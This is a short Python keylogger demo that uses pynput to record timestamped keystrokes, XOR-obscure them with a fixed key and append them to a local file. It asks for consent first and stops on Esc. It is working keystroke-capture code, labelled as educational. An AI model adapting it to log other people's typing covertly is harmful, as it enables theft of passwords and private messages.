from pynput import keyboard
from datetime import datetime
import os
LOG_FILE = "encrypted_keylog.txt"
ENCRYPTION_KEY = 123 
def encrypt(text, key):
    return ''.join(chr(ord(c) ^ key) for c in text)
def get_consent():
    print("This demo logs keystrokes for educational purposes.")
    consent = input("Do you consent to start logging? (yes/no): ").strip().lower()
    return consent == "yes"
def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {key_str}\n"
    encrypted_entry = encrypt(log_entry, ENCRYPTION_KEY)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(encrypted_entry)
    if key == keyboard.Key.esc:
        print("Logging stopped.")
        return False
if __name__ == "__main__":
    if get_consent():
        print("Logging started. Press Esc to stop.")
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    else:
        print("Consent not given. Exiting.")